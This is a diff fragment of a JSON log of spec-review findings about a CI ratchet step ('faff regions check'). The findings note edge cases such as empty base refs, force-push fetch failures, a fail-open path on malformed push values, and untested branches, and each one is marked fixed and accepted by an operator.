+      "claim": "The CI wiring is self-contradictory as written. `env: BASE_REF: ${{ github.base_ref }}` is empty on `push` events (`github.base_ref` is only populated for `pull_request`), and the spec says \"The step first fails unless `$BASE_REF` matches `^[A-Za-z0-9._/-]+$` and does not start with `-`\" — an empty string matches neither. Yet the spec also requires \"It runs without `--base` on `push` events\" and the DONE item requires push to run without `--base`. A literal build of the step fails every push to `main` at the validation line before `regions check` ever runs; the correct build (scope the validation to the `--base`/pull_request path) is only implied, never stated.",
+      "evidence": "The CI-change paragraph in \"How 'only shrinks' is enforced\" / the DONE item \"`validate.yml` runs `faff regions check --base \"origin/<base_ref>\"` on pull requests, after fetching the base, and without `--base` on push.\"",
+      "predicted_consequence": "If built literally, every push to `main` fails the validate job at the new guard — discovered only after merge, since no test in 4.6 exercises the workflow file. The spec needs one sentence placing the validation inside the pull_request/`--base` branch.",
+      "spec_anchor": "4-how",
+      "disposition": "fixed",
+      "refutation": null,
+      "disposition_rationale": "Fixed: the step branches on the event first, and each branch validates only its own value. Accepted by the operator at round 5 (human accept).",
+      "first_round": 4,
+      "last_round": 4,
+      "occurrences": [
+        {
+          "round": 4,
+          "severity": "minor",
+          "claim": "The CI wiring is self-contradictory as written. `env: BASE_REF: ${{ github.base_ref }}` is empty on `push` events (`github.base_ref` is only populated for `pull_request`), and the spec says \"The step first fails unless `$BASE_REF` matches `^[A-Za-z0-9._/-]+$` and does not start with `-`\" — an empty string matches neither. Yet the spec also requires \"It runs without `--base` on `push` events\" and the DONE item requires push to run without `--base`. A literal build of the step fails every push to `main` at the validation line before `regions check` ever runs; the correct build (scope the validation to the `--base`/pull_request path) is only implied, never stated.",
+          "spec_anchor": "4-how"
+        }
+      ]
+    },
+    {
+      "lens": "architectural",
+      "severity": "minor",
+      "claim": "The spec mandates `git fetch --depth=1 origin \"$BEFORE\"` for every non-zero `before` on a push, and \"any other git failure … is `malformed` (exit 2). It never passes.\" A force-push to `main` (or any push where the before-commit has become unreachable on the remote) makes that fetch fail, so the ratchet leg exits 2 on the push itself — the check that was supposed to police the *new* commit instead hard-fails the push event with a git error, and no amount of rebasing fixes it because the failure is in the base fetch, not the tree.",
+      "evidence": "\"The CI change\" branch for `push`: `git fetch --depth=1 origin \"$BEFORE\"`; \"Any other git failure (an unknown ref, git missing, no repository) is `malformed` (exit 2). It never passes, so a broken base read cannot disable the ratchet.\"",
+      "predicted_consequence": "a force-push (or a push whose `before` the remote will not serve) to `main` fails `regions check` with exit 2 on every re-run of that commit; the contributor's only recourse is a zero-`before` push, which the spec does not hint at.",
+      "spec_anchor": "the-ci-change",
+      "disposition": "fixed",
+      "refutation": null,
+      "disposition_rationale": "Fixed: an unreachable before commit fails the step loud, naming the commit and the likely force-push; it never skips the ratchet. Accepted by the operator at round 5 (human accept).",
+      "first_round": 5,
+      "last_round": 5,
+      "occurrences": [
+        {
+          "round": 5,
+          "severity": "minor",
+          "claim": "The spec mandates `git fetch --depth=1 origin \"$BEFORE\"` for every non-zero `before` on a push, and \"any other git failure … is `malformed` (exit 2). It never passes.\" A force-push to `main` (or any push where the before-commit has become unreachable on the remote) makes that fetch fail, so the ratchet leg exits 2 on the push itself — the check that was supposed to police the *new* commit instead hard-fails the push event with a git error, and no amount of rebasing fixes it because the failure is in the base fetch, not the tree.",
+          "spec_anchor": "the-ci-change"
+        }
+      ]
+    },
+    {
+      "lens": "architectural",
+      "severity": "minor",
+      "claim": "`--base \"origin/$BASE_REF\"` resolves the current head of the target branch, not the commit the PR forked from. If `main` converts a module (removing its allowlist entry) while a PR is open, the un-rebased PR still carries the entry, and rule 4 reports `TS-FIRST — <file>: added to legacy-js-modules.json since \"origin/main\"` — a diagnostic that is factually wrong (the PR did not add it; main removed it) and that no local run without `--base` reproduces.",
+      "evidence": "\"CI passes it on pull requests … `faff regions check --base \"origin/$BASE_REF\"`\"; rule 4: \"An allowlist entry is absent from the allowlist at `<ref>`.\"",
+      "predicted_consequence": "an open PR starts failing CI with a misleading \"you added an entry\" message after an unrelated conversion lands on main; the fix is a rebase, which the diagnostic never suggests, so contributors chase a phantom allowlist edit.",
+      "spec_anchor": "how-only-shrinks-is-enforced",
+      "disposition": "fixed",
+      "refutation": null,
+      "disposition_rationale": "Fixed: the pull_request checkout is the merge commit, so main-side removals are already applied; the diagnostic suggests a rebase for the conflict case. Accepted by the operator at round 5 (human accept).",
+      "first_round": 5,
+      "last_round": 5,
+      "occurrences": [
+        {
+          "round": 5,
+          "severity": "minor",
+          "claim": "`--base \"origin/$BASE_REF\"` resolves the current head of the target branch, not the commit the PR forked from. If `main` converts a module (removing its allowlist entry) while a PR is open, the un-rebased PR still carries the entry, and rule 4 reports `TS-FIRST — <file>: added to legacy-js-modules.json since \"origin/main\"` — a diagnostic that is factually wrong (the PR did not add it; main removed it) and that no local run without `--base` reproduces.",
+          "spec_anchor": "how-only-shrinks-is-enforced"
+        }
+      ]
+    },
+    {
+      "lens": "infosec",
+      "severity": "minor",
+      "claim": "The spec enumerates exactly two `$BEFORE` shapes for `push` — 40-hex non-zero (ratchet) and all-zeros (no ratchet) — but says nothing about a value that is neither (empty string, short SHA, non-hex). A builder implementing the branch as \"ratchet if valid, else run plain\" gets a fail-open path: the ratchet silently skips on a malformed payload instead of failing loud, and nothing in the check or the workflow test distinguishes \"skipped because new branch\" from \"skipped because the value didn't parse\".",
+      "evidence": "\"The CI change\" bullet for `push`: \"when `$BEFORE` is 40 hex characters and not all zeros … When `$BEFORE` is all zeros (a newly created branch), run `faff regions check` without `--base`.\" No third case is named. The workflow test (4.6) asserts routing and validation but not this branch's exhaustive coverage.",
+      "predicted_consequence": "on a push event with an unexpected `before` value, `regions check` runs without `--base` and a PR-free direct push that adds `evil.js` plus an allowlist entry passes CI with no ratchet applied.",
+      "spec_anchor": "the-ci-change",
+      "disposition": "fixed",
+      "refutation": null,
+      "disposition_rationale": "Fixed: the push branch has exactly three cases, and any value that is neither 40-hex nor all zeros fails the step. Accepted by the operator at round 5 (human accept).",
+      "first_round": 5,
+      "last_round": 5,
+      "occurrences": [
+        {
+          "round": 5,
+          "severity": "minor",
+          "claim": "The spec enumerates exactly two `$BEFORE` shapes for `push` — 40-hex non-zero (ratchet) and all-zeros (no ratchet) — but says nothing about a value that is neither (empty string, short SHA, non-hex). A builder implementing the branch as \"ratchet if valid, else run plain\" gets a fail-open path: the ratchet silently skips on a malformed payload instead of failing loud, and nothing in the check or the workflow test distinguishes \"skipped because new branch\" from \"skipped because the value didn't parse\".",
+          "spec_anchor": "the-ci-change"
+        }
+      ]
+    },
+    {
+      "lens": "QA",
+      "severity": "minor",
+      "claim": "The DONE criterion \"validate.yml runs `faff regions check --base \"origin/<base_ref>\"` on pull requests, and `--base \"<event.before>\"` on a push with a non-zero before … On every other event it runs without `--base`\" is not decided by any test the spec names. The workflow test in 4.6 asserts only (a) event values route through `env:` with no `${{` in `run:`, and (b) the script \"branches on the event before validating\". Neither assertion pins which `--base` (or none) each branch passes, nor the fetch. A build can satisfy the named test while the push branch runs `regions check` with no `--base`, or the pull_request branch omits the fetch/refspec, and every named test still passes.",
+      "evidence": "Section 4.6 workflow test bullet vs the fourth `--base` DONE item in section 7; the `## Scenarios` block contains no scenario for the push branch or the any-other-event branch (all seven scenarios are tree-level or pull_request-level).",
+      "predicted_consequence": "The test suite is green while the push-to-main ratchet silently doesn't exist — a direct push to `main` adding `evil.js` plus an allowlist entry passes CI, which is exactly the escape the ratchet was added to close. Decidable only by eyeballing YAML after the fact.",
+      "spec_anchor": "4-6-tests-in-test-only",
+      "disposition": "fixed",
+      "refutation": null,
+      "disposition_rationale": "Fixed: a behavioural test runs the step script with stubbed git and faff and asserts the argv for every event branch. Accepted by the operator at round 5 (human accept).",
+      "first_round": 5,
+      "last_round": 5,
+      "occurrences": [
+        {
+          "round": 5,
+          "severity": "minor",
+          "claim": "The DONE criterion \"validate.yml runs `faff regions check --base \"origin/<base_ref>\"` on pull requests, and `--base \"<event.before>\"` on a push with a non-zero before … On every other event it runs without `--base`\" is not decided by any test the spec names. The workflow test in 4.6 asserts only (a) event values route through `env:` with no `${{` in `run:`, and (b) the script \"branches on the event before validating\". Neither assertion pins which `--base` (or none) each branch passes, nor the fetch. A build can satisfy the named test while the push branch runs `regions check` with no `--base`, or the pull_request branch omits the fetch/refspec, and every named test still passes.",
+          "spec_anchor": "4-6-tests-in-test-only"
+        }
+      ]
+    },
+    {
+      "lens": "QA",
+      "severity": "minor",
+      "claim": "Rule 1 says a `.js` module is paired when its base has \"a `.ts`/`.mts`/`.cts` in `tsFiles`\", so `tsFiles` must contain `.mts`/`.cts` entries — but `regionsJsModules` is specified as listing \"`.js`, `.mjs` and `.cjs` files\" with \"TypeScript sources are listed the same way\", which pins the recursion/relative-path/sort but not the TypeScript extension set. A builder who lists only `.ts` satisfies every named test (no test case uses `.mts`/`.cts`) while rule 1's `.mts`/`.cts` clause is dead code: a legitimate `x.mts` + `x.js` pair is flagged as a new JS module. Relatedly, the emit floor switches to this lister, but the sibling computation for a non-`.ts` entry (the existing `tsf.slice(0,-3)+\".js\"` mapping yields `x..js` for `x.mts`) is never respecified, so whether an `.mts` needs an `.mjs` sibling is undecidable from the spec.",
+      "evidence": "Section 4.1 `regionsJsModules` bullet; rule 1 in section 3; the DONE item \".mjs and .cjs files are covered by rule 1\" covers the JS extension set but nothing covers TS-side recognition; no 4.6 case exercises `.mts`/`.cts`.",
+      "predicted_consequence": "A build passes all named cases while the `.mts`/`.cts` half of rule 1 is unimplemented; the first future PR using an `.mts` source fails CI incorrectly (or, via the emit floor, exits 2 on a well-paired module), and nothing in this spec's acceptance criteria would have caught either.",
+      "spec_anchor": "4-1-pure-functions-in-regions-js",
+      "disposition": "fixed",
+      "refutation": null,
+      "disposition_rationale": "Fixed: only .ts counts as a TypeScript source; .mts and .cts under bin/lib exit 2. Accepted by the operator at round 5 (human accept).",
+      "first_round": 5,
+      "last_round": 5,
+      "occurrences": [
+        {
+          "round": 5,
+          "severity": "minor",
+          "claim": "Rule 1 says a `.js` module is paired when its base has \"a `.ts`/`.mts`/`.cts` in `tsFiles`\", so `tsFiles` must contain `.mts`/`.cts` entries — but `regionsJsModules` is specified as listing \"`.js`, `.mjs` and `.cjs` files\" with \"TypeScript sources are listed the same way\", which pins the recursion/relative-path/sort but not the TypeScript extension set. A builder who lists only `.ts` satisfies every named test (no test case uses `.mts`/`.cts`) while rule 1's `.mts`/`.cts` clause is dead code: a legitimate `x.mts` + `x.js` pair is flagged as a new JS module. Relatedly, the emit floor switches to this lister, but the sibling computation for a non-`.ts` entry (the existing `tsf.slice(0,-3)+\".js\"` mapping yields `x..js` for `x.mts`) is never respecified, so whether an `.mts` needs an `.mjs` sibling is undecidable from the spec.",
+          "spec_anchor": "4-1-pure-functions-in-regions-js"
+        }
+      ]
+    }
+  ]
+}
